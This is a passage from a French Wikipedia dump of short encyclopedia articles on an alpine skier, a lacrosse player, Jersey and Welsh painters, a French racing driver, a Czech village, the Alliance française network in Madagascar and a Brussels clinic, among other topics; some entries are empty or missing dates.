En 1951, il obtient une bourse en remportant le Concorso per Giovani Cantanti Lirici avec Franco Corelli et Anita Cerquetti, ce qui lui permet de travailler avec Luigi Ricci et Riccardo Picozzi du "Teatro dell'Opera". Il porte alors le nom de Paolo Ascià, pour faire italien, le Concorso étant un concours national normalement réservé aux seuls chanteurs et chanteuses italiens, il gare ce nom pendant toute sa carrière en Italie. Cette même année, à Spolète, il tient de nouveau le rôle de Radames dans "Aida" avec Anita Cerquetti dans le rôle-titre.
Asciak quitte l'Italie pour Londres pour rejoindre le "Royal Opera House" dans la "Covent Garden Company" dont il est membre de 1952 à 1954 et comme invité jusqu'en 1958.
En , Asciak arrête sa carrière de chanteur, il retourne à Malte où il se consacre à sa famille. Il entre au département de l’Éducation jusqu'en 1984, date à laquelle il prend sa retraite avec le titre de directeur du département de la Musique. Parallèlement, il est, entre 1967 et 1973 directeur de la Musique au "St Edward's College" et représentant honoraire du "Trinity College of Music" de Londres de 1965 à 1988. En 1989, comme directeur général du théâtre national de Malte, le théâtre Manoel, il engage une compagnie polonaise pour toute la saison, mais le soir de la répétition générale, le ténor est incapable de chanter, il le remplace au pied-levé dans le rôle-titre d'Otello de Verdi, presque trente ans après avoir quitté la scène, il prouve qu'il avait toujours conservé sa voix. Entre 1994 et 1997, il forme Joseph Calleja qui deviendra le plus célèbre chanteur d'opéra maltais.

</doc>
<doc id="8978324" url="https://fr.wikipedia.org/wiki?curid=8978324" title="Ford Série T">
Ford Série T

Le Ford Série T est un fourgon produit par Ford depuis 2013. C'est la version américaine du nouveau Ford Transit qui remplace le E-Series produit depuis 53 ans jusqu'en 2014.

</doc>
<doc id="8978352" url="https://fr.wikipedia.org/wiki?curid=8978352" title="Wear leveling">
Wear leveling



</doc>
<doc id="8978354" url="https://fr.wikipedia.org/wiki?curid=8978354" title="Old Christians">
Old Christians



</doc>
<doc id="8978355" url="https://fr.wikipedia.org/wiki?curid=8978355" title="Mamak Khadem">
Mamak Khadem

Mamak Khadem est une chanteuse d'origine iranienne. Elle est la chanteuse du groupe Axiom of Choice.
Mamak Khadem a été formé au chant traditionnel persan en Iran. Elle a aussi étudié le chant indien en Californie. Son chant mêle la tradition persane à la musique contemporaine.
Elle a chanté sur de nombreuses scènes dans le monde :

</doc>
<doc id="8978358" url="https://fr.wikipedia.org/wiki?curid=8978358" title="Han Jin Song">
Han Jin Song

Han Jin Song, duan de Tai Chi/Wushu, est un des principaux représentants du Tai chi chuan en Australie. 

</doc>
<doc id="8978361" url="https://fr.wikipedia.org/wiki?curid=8978361" title="Romane Miradoli">
Romane Miradoli

Romane Miradoli est une skieuse alpine française, née le à Samoëns, dans le département de la Haute-Savoie. Elle a pris son premier départ en Coupe du monde le dans le combiné de Saint-Moritz, en Suisse, qu'elle n'a pas terminé, et a marqué ses premiers points le avec une dans le combiné d'Altenmarkt. Elle a remporté le classement du combiné de la Coupe d'Europe en 2013, puis le classement du super-G dans cette même compétition en 2015. Elle a également remporté trois médailles lors des Championnats du monde juniors, dont deux en bronze et une en argent et deux titres de championne de France juniors en 2010.
Le 5 mars 2022, en remportant sa première victoire au terme du Super-G de Lenzerheide, elle met fin à dix-sept années sans victoire féminine française dans les épreuves de vitesse en Coupe du monde.
Son grand-père, André Simond a été président de l’école de ski de Chamrousse lors des J.O de Grenoble en 1968 et maire de Samoëns de 2001 à 2008. Son oncle, François Simond a été membre des équipes de France de Ski alpin et participa à plusieurs championnat du monde de Ski et jeux olympiques durant les années 1990-2000.
Biographie.
Premières années.
Romane Miradoli naît à Samoëns le et grandit entre la station de ski de Flaine et la station village de Samoëns. Elle apprend à skier dès son plus jeune âge et intègre le Comité Mont Blanc en 2009, puis la Fédération française de ski l'année suivante. Parallèlement à sa carrière sportive, elle poursuit des études en Langues étrangères appliquées à l'Université Grenoble-Alpes dans un cursus aménagé pour les sportifs de haut niveau, après avoir obtenu un baccalauréat scientifique au lycée d'été d'Albertville. Après s'être distinguée dans plusieurs courses FIS, elle dispute sa première épreuve de Coupe d'Europe le dans le slalom géant de Courchevel, mais elle abandonne dans la seconde manche. La même année, elle obtient deux titres de championne de France juniors, l'un en super-G, l'autre en slalom géant, et gagne également une médaille d'argent en slalom.
Carrière sportive.
Succès en Coupe d'Europe et premiers pas en Coupe du monde (2010-2013).
Lors de la saison 2010-2011, Romane Miradoli intègre plus régulièrement le circuit de la Coupe d'Europe. Elle prend part également à ses premiers Championnats du monde juniors, dans la station suisse de Crans-Montana. Elle se révèle l'année suivante en remportant le super-G dans l'étape de Coupe d'Europe de Jasná, en Slovaquie, le , puis se classe du second super-G disputé le lendemain. Ces performances lui permettent de se placer au deuxième rang du classement final de la discipline. Elle se classe également des championnats de France en super-G, derrière Marion Rolland et Anne-Sophie Barthet.
La saison 2012-2013 débute de la meilleure des façons pour Romane Miradoli : au début du mois de décembre, elle remporte deux victoires en trois jours, d'abord dans le super-G de Kvitfjell puis dans le slalom géant de Trysil, en Norvège, puis monte à nouveau sur le podium lors d'un second slalom géant organisé dans la station norvégienne. Elle est alors sélectionnée avec l'équipe de France pour l'étape de Coupe du monde de Saint-Moritz. Elle dispute sa première épreuve, le combiné, mais sort de la piste dès la première manche. Elle participe ensuite au super-G, dont elle se classe , puis au slalom géant, dont elle est disqualifiée dans la première manche. Elle retrouve à nouveau les pistes de la Coupe du monde à Cortina d'Ampezzo, où elle prend la du super-G. Par la suite, ses résultats se font plus discrets, mais elle remporte deux médailles de bronze lors des Mondiaux juniors 2013 de Québec, l'une en slalom géant et l'autre en descente. En Coupe d'Europe, elle s'attribue également le classement final du combiné, tandis qu'elle pointe au cinquième rang du classement général.
Premiers points en Coupe du monde (2013-2015 ).
Lors de la saison 2013-2014, Romane Miradoli participe à six épreuves de la Coupe du monde et marque ses premiers points le lors du combiné d'Altenmarkt, en Autriche, remporté par la Canadienne Marie-Michèle Gagnon et dont elle se classe et meilleure Française. Elle se distingue lors des championnats de France en prenant la de la descente.
Romane Miradoli partage une nouvelle fois sa saison 2014-2015 entre les épreuves de Coupe d'Europe et de Coupe du monde. Avec notamment un succès à Davos et une à Hinterstoder derrière sa compatriote Marion Pellissier, elle remporte la Coupe d'Europe de super-G, le deuxième classement continental de sa carrière. Le mars, alors qu'elle dispute le combiné de Bansko, en Bulgarie, Romane Miradoli prend la et signe ainsi son premier top 10 en Coupe du monde. Dans le super-G, qui se déroule le lendemain, elle se classe et première Française. Une semaine plus tard, elle marque à nouveau des points en prenant la du super-G de Garmisch-Partenkirchen. Elle conclut sa saison avec une nouvelle médaille mondiale : lors des Mondiaux juniors de Hafjell, en Norvège, elle obtient la médaille d'argent en combiné, le jour de ses 21 ans, derrière la Suissesse Rahel Kopp.
Titulaire en équipe de France A (2015).
Pour la première fois , Romane Miradoli commence la saison 2015-2016 en tant que titulaire en équipe de de vitesse, pour les épreuves de descente ( sur 8, hors finale), de super-G ( sur 8, finale comprise) mais aussi de combiné ( sur 3).
Son début de saison est compliqué : sur six courses en 2015 elle ne marque des points que lors du combiné de Val-d'Isère. Néanmoins au fil de la saison ses résultats s'améliorent progressivement. Elle rentre dans les points en super-G dès le () à Altenmarkt-Zauchensee et y sera alors à chaque super-G du reste de la saison régulière. Le , elle marque ses premiers (deux) points de coupe du monde en descente () à la Thuile. Deux jours plus tard elle signe sur la même piste son meilleur résultat à ce jour en prenant la du super-géant. 
Le week-end suivant à Soldeu elle confirme sa bonne forme en enchaînant avec deux nouveaux top 10 : (et de nouveau meilleure française) du super-G le samedi — dans des conditions difficiles — puis du combiné le lendemain.
De nouveau meilleure française du dernier super-G de la saison régulière à Lenzerheide () elle se qualifie pour la première fois de sa carrière pour les finales dans cette discipline au côté de Tessa Worley. Elle ne finit pas la course sur la piste de St. Moritz mais termine néanmoins la saison à la dix-huitième place du classement de la spécialité avec et la qualité de meilleure française dans ce classement. 
Elle conclut cette saison — sa meilleure au niveau mondial — par deux médailles lors des championnats de France des Menuires : le bronze en descente puis l'or en super-G.
2016-2021.
En 2016, Romane Miradoli a la douleur de perdre son compagnon, qui se tue dans un accident de wingsuit. dit-elle
Sur l'ensemble de cette période en Coupe du monde, elle se classe treize fois parmi les dix premières en descente, Super-G et combiné alpin. Ses meilleurs résultats sont deux cinquièmes places lors de la saison 2018-2019, en descente à Cortina d'Ampezzo, et en Super-G à Garmisch-Partenkirchen. Elle victime d'une grave blessure au genou gauche en décembre 2020 en chutant dans le slalom géant de Courchevel et ne reprend la compétition qu'un an plus tard.
2021-2022 : première victoire.
Reprenant après une année 2021 largement consacrée à sa convalescence après sa blessure de fin 2020, elle termine aux Jeux olympiques de Beijing 2022 du Super-G et de la descente.
En mars 2022, Romane Miradoli comble un trou de 18 ans pour la France dans la discipline féminine du Super-G et de 17 ans en vitesse, en s'imposant le 5 mars 2022 sur la piste Silvano-Beltrametti de Lenzerheide avec 38/100e d'avance sur Mikaela Shiffrin et 88/100e sur Lara Gut-Behrami. Le premier podium en Coupe du monde de la skieuse de Flaine est donc une victoire. La dernière Française gagnante en Super-G était Carole Montillet, le 1er février 2004 à Haus im Ennstal, alors que pour la vitesse, il n'y avait plus eu de victoire depuis Ingrid Jacquemod dans la descente de Santa Caterina le 7 janvier 2005.
Palmarès.
Championnats du monde junior.
Romane Miradoli a participé à cinq éditions des Championnats du monde junior entre 2011 et 2015. Elle a pris le départ de dix-huit épreuves et obtenu trois médailles, dont deux médailles de bronze en descente et slalom géant et une médaille d'argent en combiné.
Championnats de France.
Élite.
9 fois championne de France élite :
Jeunes.
8 titres de Championne de France

</doc>
<doc id="8978362" url="https://fr.wikipedia.org/wiki?curid=8978362" title="Drásov (Brno)">
Drásov (Brno)



</doc>
<doc id="8978363" url="https://fr.wikipedia.org/wiki?curid=8978363" title="Drásov">
Drásov

Drásov est un toponyme qui peut désigner :

</doc>
<doc id="8978364" url="https://fr.wikipedia.org/wiki?curid=8978364" title="Mate Trojanović">
Mate Trojanović

Mate Trojanović, né le à Metković et mort le à Maribor (Slovénie), est un rameur croate.
En 1952, il participe aux Jeux olympiques d'Helsinki avec l'équipe olympique de Yougoslavie et remporte la médaille d'or au quatre sans barreur.

</doc>
<doc id="8978365" url="https://fr.wikipedia.org/wiki?curid=8978365" title="Casey Powell">
Casey Powell

Casey Powell est un joueur professionnel de crosse évoluant au poste d'attaquant pour le Launch de Floride en Major League Lacrosse. Il a réalisé sa carrière universitaire au sein de l'Orange de Syracuse.
Carrière Universitaire.
Casey Powell intégère l'Université de Syracuse en 1995.
Durant ses années universitaires, Powell domine le championnat sur le plan individuel. 
Dès sa première année il remporte le titre national avec son équipe, est nommé dans la All-Tournament Team et dans la deuxième équipe USILA All-American au poste de milieu de terrain.
Les trois années suivantes, Syracuse est éliminée en demi-finale du championnat ce qui n'empêche pas Powell d'être à chaque fois nommé dans la All-Tournament Team et dans la première équipe USILA All-American au poste d'attaquant.
Ses performances lui permettent également d'obtenir le très convoité titre de meilleur joueur du championnat (Most Outstanding Player) en 1997 et 1998, d'être nommé meilleur milieu de terrain de l'année en 1996 et meilleur attaquant de l'année en 1998.
En plus des récompenses obtenues, les entraîneurs des autres équipes l'encensent dans les medias. Pour Tony Seaman, l'entraîneur de l'Université Johns-Hopkins, Powell est la "seconde chose la plus proche de Dieu". Dick Powell, de l'Université du Maryland, déclare qu'"il n'y a aucun doute sur le fait qu'il est le meilleur attaquant du moment".
Sa domination sur le terrain pousse même son entraîneur, Roy Simmons, a le mettre sur le banc. Le , au début des prolongations du dernier match de la saison régulière en face à Hobart, Simmons garde Powell sur la touche. Il expliquera plus tard sa décision. Le plan de jeu de l'équipe adverse tournait exclusivement sur le contrôle de Powell par la défense. En mettant celui-ci sur le banc, l'adversaire était déstabilisé. Sans jouer, l'influence et la crainte qu'il suscitait était donc utile à l'équipe, et lorsque Simmons décide finalement qu'il est temps de le faire entrer sur le terrain, Powell inscrit le but de la victoire.
Carrière Professionnelle.
Carrière en MLL.
Casey Powell rejoint la Major League Lacrosse dès sa création en 2001. Il joue alors sous les couleurs des Lizards de New York (Lizards de Long Island à l'époque).
Au côté notamment de Paul Gait, il remporte avec les Lizards le tout premier titre MLL. L'année suivante, il participe encore à la finale du championnat mais sans succès cette fois-ci. Il termine la saison meilleur marqueur et meilleur passeur de la ligue.
À l'issue de la saison 2002, Powell est échangé aux Rattlers de Rochester où il rejoint son frère Ryan. La saison 2003 se solde par un échec. L'équipe ne se qualifie pas pour les playoffs.
En 2004 et 2005, l'équipe échoue à nouveau mais atteint tout même les demi-finales. Powell reçoit toutefois son premier titre individuel en MLL. Il est nommé meilleur attaquant de l'année.
Le , il annonce qu'il ne participera pas à la saison MLL qui se prépare. Comme d'autres joueurs, il fait ce choix afin de préparer dans les meilleures conditions possibles le championnat du monde 2006 avec l'équipe des États-Unis.
De retour avec les Rattlers en 2007, Powell et son équipe échouent une nouvelle fois en demi-finale du championnat avant de finalement remporter le titre l'année suivante (2008).
En 2009, de nombreux changements décidés par la ligue mettent fin à l'existence des Rattlers. Powell est envoyé d'office à Toronto. Il refuse de signer son contrat et ne joue pas la saison 2009.
En 2010, Powell est sélectionné par le Machine de Chicago lors de la Supplemental Draft mais choisit finalement de ne pas jouer en MLL cette saison.
En raison d'une blessure, il ne revient sur les terrains de la ligue qu'à la fin de la saison 2011 avec les Nationals de Hamilton. Il joue les deux derniers matchs de la saison régulière, la demi-finale et la finale (perdue) du championnat. Il se blesse lors de cette dernière mais finit tout de même meilleur marqueur des playoffs avec 5 buts et 8 points.
En 2012, toujours handicapé par sa blessure survenue lors de la finale 2011, il ne participe pas au début de saison. Très vite après son retour, il est suspendu pour un match à la suite d'un choc illégal lors de la rencontre du face aux Bayhawks de Chesapeake. Sa suspension se voit prolonger à toute la saison 2012 et à la saison 2013. Il explique que la ligue a pris cette décision à la suite de sa participation à une autre compétition, la Lake Placid Summit Classic les et décide de se retirer de la ligue. Il laisse toutefois sous entendre qu'il pourrait revenir signant le mail dans lequel il annonce son retrait au magazine Inside Lacrosse "Sincérement, Brett Favre", une référence au quarterback américain ayant annoncé plusieurs fois sa retraite avant de revenir en NFL.
En 2013, il rejoint finalement l'effectif des Bayhawks qu'ils l'ont sélectionné lors de la Supplemental Draft. Là encore il manque le début de la saison et ne pose le pied sur un terrain MLL que le , soit trois mois après le début du championnat. La saison 2013 se conclut mieux que les précédentes pour Powell qui remporte avec les Bayhawks son troisième titre.
En il est envoyé au Launch de Floride en échange de Joe Walters. La saison 2014 lui permet de renouer avec une saison complète. Ses prestations sur le terrain lui permettent même d'être élu MVP de la saison et ce, malgré la non-qualification de son équipe pour les "playoffs".
Carrière en NLL.
Le , Powell est sélectionné en premier choix de la draft par les Knighthawks de Rochester.
Pour sa première année dans la ligue il marque 9 buts et réalise 21 passes durant la saison régulière. Les Knighhawks se qualifient pour les playoffs puis pour la finale qu'ils perdent finalement face à Toronto.
Il joue encore une saison avec Rochester. À la fin de l'année 2000, Powell met de côté sa carrière en NLL pour se concentrer sur son emploi chez l'équipementier Warrior Lacrosse.
En 2001, les Knighthawks se séparent de Powell et ses droits son acquis par les Bandits de Buffalo. Il signe un contrat avec l'équipe mais ne se présentera jamais à Buffalo. Il est échangé fin 2003 au Storm d'Anaheim.
Il joue 2 saisons (2004 et 2005) avec l'équipe californienne qui termine chaque année dans les fonds du classement NLL ce qui n'empêche pas Powell d'être sélectionné ces deux années pour le All-Star Game.
À la fin de la saison 2005, le Storm disparait. Ses droits sont acquis par les Lumberjax de Portland mais Powell décide de ne pas jouer durant la saison 2006. Il est alors échangé à la fin de l'année aux Titans de New York. Il joue trois années pour New York à l'issue desquelles il est à chaque fois sélectionné pour participer au All-Star Game. 
À la fin de la saison 2009, les Titans quittent New York pour Orlando. Powell signe avec cette nouvelle équipe avant le début de la saison 2010. Il permet à la franchise de terminer la saison régulière en tête de la division Est mais les Titans échouent ensuite en demi-finales. Powell réalise une excellente année. Il marque 44 buts et effectue 36 assistances en saison régulière, une performance qui lui permet d'être nommé MVP 2010 et d'être de nouveau appelé pour le All-Star Game.
Il quitte Orlando à la fin de la saison pour rejoindre les Blazers de Boston. Il réalise encore une bonne saison 2011 mais n'obtient cette fois-ci aucune récompense collective ou individuelle.
Les Blazers disparaissent à la fin de la saison et les droits de Powell sont acquis par les Knighthawks de Rochester. Il décide de ne pas jouer la saison 2012 en raison d'un genou blessé et est donc placé sur la hold out list par les Knighthawks.
Il signe de nouveau avec Rochester pour la saison 2013. Il commence le championnat mais est échangé en cours de route au Mammoth du Colorado. Ironie du sort, après un mauvais départ en saison régulière, les Knighthawks remportent finalement la finale du championnat sans Powell.
À l'aube de la saison 2014, Powell annonce au Mammoth qu'il ne peut pas s'engager avec l'équipe pour des raisons personnelles. Il manque le début du championnat mais fait son retour pour le huitième match de la saison.
En 2015, Powell n'est présent dans aucun effectif NLL.

</doc>
<doc id="8978366" url="https://fr.wikipedia.org/wiki?curid=8978366" title="Drásov (district de Příbram)">
Drásov (district de Příbram)

Drásov est une commune du district de Příbram, dans la région de Bohême-Centrale, en République tchèque. Sa population s'élevait à habitants en 2020.
Géographie.
Drásov se trouve à à l'est-nord-est de Příbram et à au sud-ouest de Prague.
La commune est limitée par Suchodol au nord-ouest et au nord, par Dlouhá Lhota au nord, par Ouběnice au nord-est, par Višňová à l'est et au sud, et par Dubenec à l'ouest.
Histoire.
La première mention écrite du village date de 1057. Il se trouve dans la région historique de Bohême.
Transports.
Par la route, Drahlín se trouve à de Příbram et à de Prague.

</doc>
<doc id="8978372" url="https://fr.wikipedia.org/wiki?curid=8978372" title="Institut d'Ingénierie Physique de Moscou">
Institut d'Ingénierie Physique de Moscou



</doc>
<doc id="8978379" url="https://fr.wikipedia.org/wiki?curid=8978379" title="Cézanne peint">
Cézanne peint

Cézanne peint est une chanson interprétée par France Gall. Écrite, composée et produite par Michel Berger, elle figure sur l'album "Débranche !", paru en avril 1984.
Thème et contexte.
France Gall note dans le livret de son intégrale "Évidemment" de 2004 (les années Warner) : . D'après une biographie consacrée à France Gall écrite par Pierre Pernez, la chanteuse a pris de l'assurance, déclarant qu'elle , lui permettant .
Les coups de tonnerre qui ponctuent la fin de la chanson rappellent que Paul Cézanne, alors qu'il peignait dans la campagne aixoise en octobre 1906, fut victime d'un malaise à la suite d'un violent orage et d'une très forte averse qui s'abattit sur lui. Il est décédé quelques jours plus tard des suites d’une pneumonie.
Sortie et accueil.
"Cézanne peint" sort en 45 tours en comme quatrième et dernier extrait de l'album "Débranche !", sorti l'année précédente avec pour face B un autre titre de l'album, "Savoir vivre". Toutefois, le single n'est pas parvenu à entrer dans le Top 50, alors que les trois précédents extraits de l'album ont figuré dans le Top.
En janvier 2018, à la suite du décès de la chanteuse, il atteint directement la place du classement des singles téléchargés.

</doc>
<doc id="8978381" url="https://fr.wikipedia.org/wiki?curid=8978381" title="Gerald Mortag">
Gerald Mortag

Gerald Mortag (né le à Gera (Thuringe, Allemagne de l'Est) et mort le ) est un coureur cycliste et entraîneur allemand.
Biographie.
Durant sa carrière de coureur, Gerald Mortag est trois fois champion du monde de poursuite par équipes amateurs, en 1977, 1978 et 1979, avec l'équipe de RDA. Aux Jeux olympiques de 1980, avec Uwe Unterwalder, Volker Winkler et Matthias Wiegand, il est médaillé d'argent de la poursuite par équipes.
En 1987, Gerald Mortag est diplômé de l'École supérieure allemande de culture physique de Leipzig. En 1990, il rejoint le SSV Gera, fondé cette année-là. Il entraîne cette équipe, successivement renommée SSV Gera-Team Köstritzer en 1994, Gera/Erfurt-Team Köstritzer en 1997, TEAG Team Köstritzer en 1999, puis Thüringer Energie, avec le statut d'équipe continentale, en 2006.

</doc>
<doc id="8978394" url="https://fr.wikipedia.org/wiki?curid=8978394" title="Alliance française à Madagascar">
Alliance française à Madagascar

L’Alliance française à Madagascar constitue actuellement un réseau couvrant toutes les régions de la Grande Île. Chaque implantation est gérée par une association de droit malgache sans but lucratif et la coordination est assurée par un délégué général de la Fondation Alliance française. 
L'objet de ce réseau est de développer des cours de français et la formation de professeurs de français et de proposer des activités culturelles. Chaque centre propose une bibliothèque/médiathèque.
L’Alliance française à Madagascar a été reconnue d'utilité publique par le gouvernement malgache (décret 2012-726 en date du ).
Historique.
Dès la fin du (1888), des établissements appelés "Écoles de Madagascar" sont ouverts par l’Alliance française de l’Île Maurice, fondée en 1884, un an après l'Alliance française de Paris. La création de l'Alliance française de Tananarive est décidée après la Seconde Guerre mondiale et intervient effectivement en 1947. Les autres centres sont créés après l'indépendance du pays.
Organisation.
En 2011, le réseau comprenait quelque 800 personnes impliquées : un tiers de membres des Conseils d’administration bénévoles, un tiers d’enseignant(e)s et un tiers d'autres salariés. Le ministère français des Affaires étrangères détache auprès des principales Alliances du personnel rémunéré par le gouvernement français, notamment des volontaires internationaux, ainsi que des subventions qui viennent compléter leurs ressources propres. Le délégué général de la Fondation Alliance française à Madagascar, qui est également directeur de l'Alliance française de Tananarive, est généralement un professeur français ayant une expérience du réseau mondial de l'Alliance française. Depuis 2017, c'est Jean-Paul Clément qui occupe ce poste, succédant à Marc Sarrazin arrivé en 2013.
Le Conseil général de La Réunion finance des missions (opérées dans le cadre de France Volontaires) confiées à des volontaires du Service civique à l’international, des volontaires de solidarité internationale (VSI) ou sous contrat unique d’insertion (CUI), qui viennent en appui à des structures malgaches, dans les Alliances françaises, mais aussi des clubs de français dans les lycées publics malgaches, et des associations sportives, culturelles et sociales.
Outre l'Ambassade de France à Madagascar, l'Institut français, la Fondation Alliance française, l'Alliance française entretient des partenariats avec diverses structures :
Composition du réseau.
Depuis 2001, le réseau compte 29 associations.

</doc>
<doc id="8978397" url="https://fr.wikipedia.org/wiki?curid=8978397" title="John Saint-Hélier Lander">
John Saint-Hélier Lander

John Saint-Hélier Lander, né John Hélier Lander, le à Saint-Hélier et mort le à Witley, dans le district de Waterley dans le Surrey en Angleterre, est un artiste-peintre portraitiste et paysagiste originaire de Jersey.
Biographie.
John Hélier Lander ajouta le mot "Saint" à son nom pour indiquer nommément l'origine de son lieu de naissance, Saint-Hélier. Son père, cordonnier, s'opposa à sa passion du dessin et le jeune John Hélier Lander devint apprenti chez un horloger. Mais la passion pour la peinture, qu'il pratiquait en cachette de son père, lui permit de faire connaître ses premières toiles et de rencontrer sa compatriote de Jersey, la comédienne Lillie Langtry qui lui offrit sa première boîte de peinture. Quand son père apprit que les gens parlaient de son fils avec admiration pour son talent artistique et que de surcroît il était payé pour ses réalisations, il ne s'opposa plus à l'art créatif de celui-ci. Peu après, John Hélier Lander rencontra son compatriote, le peintre John Everett Millais qui lui conseilla de suivre une formation artistique dans les célèbres académies anglaises et françaises. Il passa une année à l'école de Calderon à Hampstead, puis fut élève de William-Adolphe Bouguereau et Tony Robert-Fleury à l'Académie Julian de Paris. Enfin il termina sa formation artistique à la Royal Academy de Londres.
John Saint-Hélier Lander s'en retourna à Jersey et ouvrit un atelier dans lequel il donnait des cours particuliers. Il fit de même sur l'île voisine de Guernesey. Il a entrepris un travail ambitieux en faisant un portrait de groupe des édiles de Jersey lors de la séance solennelle des Assises d'Héritage, œuvre pour laquelle il mit quatre années pour terminer l'ouvrage. Il peignit des scènes de la vie quotidienne à Jersey ainsi que de nombreux portraits d'habitants de l'île Anglo-Normande, notamment son compatriote artiste caricaturiste et illustrateur Edmond Blampied.
Il a été fortement encouragé par le lieutenant-gouverneur de Jersey à l'époque, le général Henry Richard Abadie. Lorsque le général quitta Jersey, en 1904, John Saint-Hélier Lander le suivit à Londres, où Abadie le présenta à ses relations dans la société britannique qui devinrent des visiteurs réguliers à son atelier de peintre. Il fit ainsi la connaissance de tous les principaux généraux britanniques avant la Première Guerre mondiale.
En 1923, il a reçu une médaille d'argent au Salon de Paris et peint son premier portrait royal avec le portrait du Prince de Galles. John Saint-Hélier Lander a choisi de dépeindre le prince habillé dans tenue sportive avec polo. La toile a été acclamée et reçut une médaille au Salon de Paris. Le roi et la reine ordonna que la toile soit envoyé au palais de Buckingham. La Reine a commandé alors un portrait du duc de Kent en tenue de joueur de tennis. Par la suite, il fit les portraits de la famille royale, George V d'Angleterre, George VI d'Angleterre, la reine Elisabeth, sa fille et d'autres princes.

</doc>
<doc id="8978398" url="https://fr.wikipedia.org/wiki?curid=8978398" title="The Opposition (homonymie)">
The Opposition (homonymie)

The Opposition ("L'Opposition" en français) peut désigner :

</doc>
<doc id="8978401" url="https://fr.wikipedia.org/wiki?curid=8978401" title="John Saint-Helier Lander">
John Saint-Helier Lander



</doc>
<doc id="8978403" url="https://fr.wikipedia.org/wiki?curid=8978403" title="Liste des séries cinématographiques">
Liste des séries cinématographiques



</doc>
<doc id="8978405" url="https://fr.wikipedia.org/wiki?curid=8978405" title="Lionel Robert">
Lionel Robert

Lionel Robert, né au Mans le , est un pilote automobile français. 
Auteur de débuts remarqués en Formule Renault et Formule 3, il est surtout connu pour ses participations aux 24 Heures du Mans et son expertise dans le monde des courses d’endurance. Toujours en activité à ce jour, il est également entraîneur sportif pour le haut niveau (DE JEPS), moniteur de pilotage (BP JEPS) et journaliste (pilote essayeur) pour la presse écrite.
Biographie.
Le journalisme.
Auteur de nombreux communiqués de presse dans les années 1980, pigiste pour les revues Ex-aequo ou Speed dans les années 1990, Lionel Robert s’est vu confier, en , le poste de pilote-essayeur par le Groupe Michel Hommell pour le compte du magazine de voitures anciennes Echappement Classic. Il propose chaque mois à ses lecteurs un essai mariant parfaitement les côtés technique et humain. Des expériences personnelles vécues à bord s’ajoutent parfois à cet essai mensuel.
Il est à noter qu’un parfait homonyme, s’appelant lui aussi Lionel Robert, exerce depuis plus de vingt ans le métier de journaliste. En , cet homonyme a pris la direction du magazine Auto Moto. Il ne faut donc pas les confondre. L’un est un homme de presse qui ne pilote pas en compétition, l’autre est un pilote expérimenté qui s’appuie sur ses connaissances techniques et sportives pour transmettre aux lecteurs un peu de sa passion.
Le coaching et l’expertise en sport automobile.
Pilote automobile depuis plus de trente ans, Lionel Robert est aussi un moniteur doublement diplômé dans l’enseignement du pilotage. À ce titre il dispense ses conseils et sa formation lors de journées de roulage libre (trackdays) mais aussi en compétition accompagnant des pilotes, jeunes ou moins jeunes, dans leurs premiers pas en course automobile.
Son rôle d’expert est également reconnu par les médias spécialisés qui souvent recueillent son avis sur l’avenir du sport automobile français et international. 
En 1994, interviewé par Jean-Marc Teissedre, Lionel Robert déclarait à propos des 24 Heures du Mans : ‘’en dehors de l’événement sportif, il faut que l’épreuve se traduise par une semaine de fête, impliquant davantage la population locale. Pourquoi ne pas utiliser cette période pour organiser des rencontres, des conférences et de nombreuses autres manifestations comme cela existe aux États-Unis ou à Suzuka ?’’ Un an plus tard, naissait la parade des pilotes en plein centre-ville du Mans puis, plus tard, de nombreuses autres manifestations à Saint Saturnin, Arnage ou Ruaudin.
À l’automne 2013 dans une tribune libre parue sur les sites internet spécialisés, Lionel Robert proposait la création de slow zones lors d’incidents de course pendant les 24 Heures du Mans afin de ne pas neutraliser entièrement les du circuit sarthois. Cette idée sera reprise et mise en place par le club organisateur de la célèbre course dès l’édition 2014.
Sur un plan technique, il a collaboré au développement de nombreux prototypes de course travaillant notamment pour les marques suivantes : Automobiles Martini, Synergie Automobiles, RJ Racing, Courage Compétition, CVO Racing, Automobiles Ligier et Beta Epsilon.

</doc>
<doc id="8978409" url="https://fr.wikipedia.org/wiki?curid=8978409" title="Henry Clarence Whaite">
Henry Clarence Whaite

Henry Clarence Whaite est un artiste peintre anglais né en 1828 à Manchester et mort en 1912 au pays de Galles. Il est surtout connu pour ses aquarelles de paysages gallois.
Biographie.
Clarence Whaite naît le à Manchester, où ses parents tiennent commerce d'objets d'art comme des tableaux et des cadres, dans leur propre galerie. Il fréquente essentiellement la "grammar school" de Manchester, puis entre en école de beaux-arts à la Manchester School of Design. Après quelques années, il se rend à Londres pour y poursuivre sa formation auprès de James Mathews Leigh, ainsi que dans les écoles de Somerset House et de l'Académie Royale.
En 1850 il voyage en Suisse, en Allemagne et surtout au pays de Galles dont les paysages le marquent durablement. Il découvre ainsi le village de Betws-y-Coed, dont l'aspect pittoresque attire alors de nombreux artistes ; il y fait notamment la rencontre de David Cox.
Whaite est un chrétien fervent, ce qui a un impact important sur sa vie et sur son œuvre. Il passe la première partie de sa carrière à Manchester, puis s'installe au début des années 1870 sur les rives de la Conwy dans sa résidence de "Tyddyn Cynal", dans le nord du pays de Galles. Il épouse en 1876 Jane Alice Griffiths, dont il aura une fille, Lily Florence Whaite (1876–1959), également artiste peintre.
Il meurt à Tyddyn Cynal le , et est inhumé à la nouvelle église de Llangelynnin.
Carrière.
Une critique favorable de Ruskin en 1859 aide considérablement sa carrière.
Whaite fait partie des tout premiers membres de l'Académie des Beaux-Arts de Manchester, et joue ensuite un rôle prépondérant dans la création de l'Académie royale cambrienne des Beaux-Arts, qu'il préside de 1885 jusqu'à sa mort.

</doc>
<doc id="8978412" url="https://fr.wikipedia.org/wiki?curid=8978412" title="Clinique César De Paepe">
Clinique César De Paepe

La Clinique César De Paepe est un établissement hospitalier de Bruxelles qui fait partie depuis 2015 du Centre hospitalier universitaire de Bruxelles. Elle est située au n° 11-13 de la rue des Alexiens à Bruxelles.
Origine du nom.
Clinique mutualiste socialiste, elle porte le nom de César De Paepe en référence au médecin et homme politique belge. 
Historique.
